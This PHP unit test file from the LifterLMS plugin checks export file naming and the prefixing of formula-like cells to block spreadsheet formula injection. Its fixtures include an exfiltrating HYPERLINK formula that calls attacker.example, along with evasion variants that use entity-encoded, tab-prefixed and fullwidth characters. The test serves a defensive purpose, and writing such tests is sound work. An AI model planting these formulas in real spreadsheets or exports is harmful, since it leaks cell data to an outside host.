<?php
/**
 * Tests {@see LLMS_Abstract_Exportable_Admin_Table}.
 *
 * @package LifterLMS/Tests/Abstracts
 *
 * @group abstracts
 * @group admin_tables
 *
 * @since 7.0.1
 */
class LLMS_Test_Abstract_Exportable_Admin_Table extends LLMS_UnitTestCase {

	/**
	 * Retrieves a mock for the abstract class.
	 *
	 * @since 7.0.1
	 *
	 * @return LLMS_Abstract_Exportable_Admin_Table
	 */
	private function get_mock( $id = 'mock', $title = 'Mock Title' ) {
		$mock = $this->getMockForAbstractClass(
			LLMS_Abstract_Exportable_Admin_Table::class,
			array(),
			'',
			true,
			true,
			true,
			array( 'get_title' )
		);
		LLMS_Unit_Test_Util::set_private_property( $mock, 'id', $id );

		$mock->method( 'get_title' )->willReturn( $title );

		return $mock;
	}

	/**
	 * Tests {@see LLMS_Abstract_Exportable_Admin_Table::get_export_file_name}
	 *
	 * @since 7.0.1
	 */
	public function test_get_export_file_name() {

		$pass = function( $pass ) {
			return 'ABCD1234';
		};
		add_filter( 'random_password', $pass );

		$now  = time();
		$date = date( 'Y-m-d', $now );
		llms_tests_mock_current_time( $now );

		$this->assertEquals(
			"mock-title_export_{$date}_ABCD1234",
			$this->get_mock()->get_export_file_name()
		);

		remove_filter( 'random_password', $pass );

	}

	/**
	 * Tests {@see LLMS_Abstract_Exportable_Admin_Table::get_export_file_name}
	 * when the table's title contains special characters.
	 *
	 * @link https://github.com/gocodebox/lifterlms/issues/1540
	 *
	 * @since 7.0.1
	 */
	public function test_get_export_file_name_special_chars() {

		$pass = function( $pass ) {
			return 'ABCD1234';
		};
		add_filter( 'random_password', $pass );

		$now  = time();
		$date = date( 'Y-m-d', $now );
		llms_tests_mock_current_time( $now );

		$this->assertEquals(
			"الطلاب_export_{$date}_ABCD1234",
			$this->get_mock( 'mock', 'الطلاب' )->get_export_file_name()
		);

		remove_filter( 'random_password', $pass );

	}

	/**
	 * Tests {@see LLMS_Abstract_Exportable_Admin_Table::get_title} stub.
	 *
	 * @since 7.0.1
	 */
	public function test_get_title() {

		$mock = $this->getMockForAbstractClass(
			LLMS_Abstract_Exportable_Admin_Table::class
		);
		LLMS_Unit_Test_Util::set_private_property( $mock, 'id', 'mock' );

		$this->setExpectedIncorrectUsage(
			'LLMS_Abstract_Exportable_Admin_Table::get_title'
		);
		$this->assertEquals( 'mock', $mock->get_title() );

	}

	/**
	 * Formula-looking export cells are prefixed. Plain numbers are not.
	 *
	 * @since [version]
	 *
	 * @return void
	 */
	public function test_get_export_prefixes_spreadsheet_formulas() {

		$table        = new LLMS_Test_Table_Formula_Export();
		$table->rows  = array(
			array(
				'name' => '=1337*7',
				'num'  => '-12.5',
			),
			array(
				'name' => '=HYPERLINK("http://attacker.example/?x="&B1,"ClickMe")',
				'num'  => '+42',
			),
			array(
				'name' => '&#61;1337*7',
				'num'  => '+1+1',
			),
			array(
				'name' => "\t=1+1",
				'num'  => '-1337*7',
			),
			array(
				'name' => '@SUM(A1)',
				'num'  => '0%',
			),
			array(
				'name' => 'Ada',
				'num'  => '',
			),
			array(
				'name' => '&nbsp;=1337*7',
				'num'  => "\u{00A0}-12.5",
			),
			array(
				'name' => "\u{3000}=1+1",
				'num'  => "\u{FF0D}12.5",
			),
			array(
				'name' => "\u{FF1D}1337*7",
				'num'  => "\u{FF0B}1+1",
			),
			array(
				'name' => "\u{FF20}SUM(A1)",
				'num'  => "\u{00A0}Ada",
			),
		);

		$export = $table->get_export();

		// Header row is not a data cell.
		$this->assertEquals( array( 'name' => 'Name', 'num' => 'Num' ), $export[0] );

		$this->assertSame( "'=1337*7", $export[1]['name'] );
		$this->assertSame( '-12.5', $export[1]['num'] );

		$this->assertSame( '\'=HYPERLINK("http://attacker.example/?x="&B1,"ClickMe")', $export[2]['name'] );
		$this->assertSame( '+42', $export[2]['num'] );

		// Entity-encoded "=" is decoded before the prefix check.
		$this->assertSame( "'=1337*7", $export[3]['name'] );
		$this->assertSame( "'+1+1", $export[3]['num'] );

		$this->assertSame( "'\t=1+1", $export[4]['name'] );
		$this->assertSame( "'-1337*7", $export[4]['num'] );

		$this->assertSame( "'@SUM(A1)", $export[5]['name'] );
		$this->assertSame( '0%', $export[5]['num'] );

		$this->assertSame( 'Ada', $export[6]['name'] );
		$this->assertSame( '', $export[6]['num'] );

		$nbsp = html_entity_decode( '&nbsp;', ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401, 'UTF-8' );
		$this->assertSame( "'" . $nbsp . '=1337*7', $export[7]['name'] );
		$this->assertSame( "\u{00A0}-12.5", $export[7]['num'] );

		$this->assertSame( "'\u{3000}=1+1", $export[8]['name'] );
		$this->assertSame( "\u{FF0D}12.5", $export[8]['num'] );

		$this->assertSame( "'\u{FF1D}1337*7", $export[9]['name'] );
		$this->assertSame( "'\u{FF0B}1+1", $export[9]['num'] );

		$this->assertSame( "'\u{FF20}SUM(A1)", $export[10]['name'] );
		$this->assertSame( "\u{00A0}Ada", $export[10]['num'] );

	}

}

/**
 * Minimal exportable table that returns cell values unchanged.
 *
 * @since [version]
 */
class LLMS_Test_Table_Formula_Export extends LLMS_Admin_Table {

	/**
	 * Rows returned by get_results().
	 *
	 * @var array
	 */
	public $rows = array();

	/**
	 * Unique ID for the table.
	 *
	 * @var string
	 */
	protected $id = 'formula';

	/**
	 * Is the table exportable?
	 *
	 * @var bool
	 */
	protected $is_exportable = true;

	/**
	 * Load the fixture rows.
	 *
	 * @since [version]
	 *
	 * @param array $args Query args.
	 * @return void
	 */
	public function get_results( $args = array() ) {
		$this->tbody_data   = $this->rows;
		$this->current_page = 1;
	}

	/**
	 * No query args.
	 *
	 * @since [version]
	 *
	 * @return array
	 */
	public function set_args() {
		return array();
	}

	/**
	 * Two export columns.
	 *
	 * @since [version]
	 *
	 * @return array
	 */
	protected function set_columns() {
		return array(
			'name' => array(
				'exportable' => true,
				'title'      => 'Name',
			),
			'num'  => array(
				'exportable' => true,
				'title'      => 'Num',
			),
		);
	}

	/**
	 * Return the fixture value. Skips the parent sanitizer on purpose.
	 *
	 * @since [version]
	 *
	 * @param string $key  Column key.
	 * @param array  $data Row.
	 * @return mixed
	 */
	public function get_export_data( $key, $data ) {
		return $data[ $key ];
	}

	/**
	 * Unused display-cell stub.
	 *
	 * @since [version]
	 *
	 * @param string $key  Column key.
	 * @param mixed  $data Row.
	 * @return string
	 */
	public function get_data( $key, $data ) {
		return '';
	}

}
